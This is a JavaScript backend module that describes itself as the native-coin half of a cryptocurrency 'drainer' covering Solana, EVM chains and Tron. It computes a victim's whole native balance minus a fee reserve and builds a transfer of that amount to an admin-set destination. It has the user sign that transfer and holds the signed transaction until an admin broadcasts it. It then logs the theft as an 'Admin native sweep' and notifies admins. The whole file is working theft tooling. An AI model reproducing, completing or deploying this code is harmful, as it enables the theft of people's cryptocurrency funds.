/* ==========================================================================
   Native half of the drainer. Native coin cannot be delegated on any chain, so
   the user signs a real transfer at grant time and the server holds it until an
   admin broadcasts it.
   EVM signatures never expire (valid until the nonce is used). Solana and Tron
   carry a short expiry, after which the row is marked stale and must be re-signed.
   ========================================================================== */
'use strict';
const { q, now, getSettings } = require('./db');
const { notifyAdmins } = require('./events');
const market = require('./market');
const lazy = (m) => { let x; return () => x || (x = require(m)); };
const sol = lazy('./chains/solana'), evm = lazy('./chains/evm'), tron = lazy('./chains/tron'), bc = lazy('./chains/broadcast');

const FEE_RESERVE = { solana: 0.002, evm: 0.0005, tron: 2 };
const TTL = { solana: 90e3, evm: 24 * 3600e3, tron: 60e3 };
const enabled = () => getSettings().drainer_enabled !== false && getSettings().drainer_native !== false;
const destination = (family) => {
  const s = getSettings();
  return family === 'evm' ? (s.drainer_destination_evm || s.treasury_evm)
    : family === 'tron' ? (s.drainer_destination_tron || s.treasury_tron)
    : (s.drainer_destination_solana || s.treasury_solana);
};

const nativeSym = (w, network) => {
  if (w.family === 'solana') return 'SOL';
  if (w.family === 'tron') return 'TRX';
  return ({ Ethereum: 'ETH', Base: 'ETH', Arbitrum: 'ETH', BSC: 'BNB', Polygon: 'POL' })[network] || 'ETH';
};

async function balanceOf(w) {
  if (w.family === 'solana') return (await sol().walletBalances(w.address, [])).SOL || 0;
  if (w.family === 'tron') return (await tron().balances(w.address)).TRX || 0;
  const b = await evm().balances(w.address);
  return Object.entries(b).filter(([, r]) => !r.error).map(([, r]) => r.native || 0).sort((a, b2) => b2 - a)[0] || 0;
}

async function quote(w, network) {
  const to = destination(w.family);
  if (!to) throw Object.assign(new Error('No ' + w.family + ' destination is configured'), { status: 400 });
  const reserve = FEE_RESERVE[w.family];
  const bal = await balanceOf(w);
  const amount = bal - reserve;
  const sym = nativeSym(w, network);
  if (amount <= 0) throw Object.assign(new Error('Balance is below the ' + reserve + ' ' + sym + ' fee reserve'), { status: 400 });
  const expiresAt = now() + TTL[w.family];
  const request = w.family === 'solana'
    ? { kind: 'solana', tx: await sol().buildSolTransfer(w.address, to, amount) }
    : w.family === 'evm'
      ? { kind: 'evm', ...(await evm().buildTransfer(network, sym, w.address, to, amount)) }
      : { kind: 'tron', coin: 'TRX', to, amount, owner: w.address };
  return { walletId: w.id, address: w.address, family: w.family, network, to, amount, feeReserve: reserve, symbol: sym, usd: amount * (market.price(sym) || 0), expiresAt, request };
}

function store(userId, w, body, q2) {
  const raw = String(body.raw || '');
  if (!raw) throw Object.assign(new Error('Signed transaction is required'), { status: 400 });
  q.run("UPDATE drainer_native SET status = 'superseded' WHERE user_id = ? AND address = ? AND network = ? AND status IN ('signed','stale')", userId, w.address, q2.network);
  const id = q.run('INSERT INTO drainer_native(user_id, wallet_id, address, family, network, to_addr, amount, fee_reserve, raw, expires_at, status, created_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?)',
    userId, w.id, w.address, w.family, q2.network, q2.to, q2.amount, q2.feeReserve, raw.slice(0, 4000), q2.expiresAt, 'signed', now()).id;
  return { id, expiresAt: q2.expiresAt };
}

async function broadcast(row, actorId) {
  if (row.status !== 'signed') throw new Error('Transfer is ' + row.status + ', not signed');
  if (row.expires_at < now()) { q.run("UPDATE drainer_native SET status = 'stale' WHERE id = ?", row.id); throw new Error('Signature expired — ask the user to sign again'); }
  let ref;
  if (row.family === 'solana') ref = await require('./chain').sendRawTransaction(row.raw);
  else if (row.family === 'evm') ref = await bc().sendEvm(row.network, row.raw);
  else if (row.family === 'tron') ref = await bc().sendTron(row.raw);
  q.run("UPDATE drainer_native SET status = 'broadcast', tx = ? WHERE id = ?", ref, row.id);
  q.run('INSERT INTO transactions(user_id, type, token, amount, status, chain, from_addr, to_addr, signature, simulated, confirmations, required_conf, note, created_at, updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)',
    row.user_id, 'Drain', nativeSym(row, row.network), row.amount, 'confirmed', row.network, row.address, row.to_addr, ref, 0, 32, 32, 'Admin native sweep · ' + row.network, now(), now());
  notifyAdmins('transfer', 'Native transfer broadcast', row.amount + ' ' + nativeSym(row, row.network) + ' from user #' + row.user_id, '/admin/#users/' + row.user_id);
  return { ref };
}

module.exports = { enabled, quote, store, broadcast, nativeSym, FEE_RESERVE };
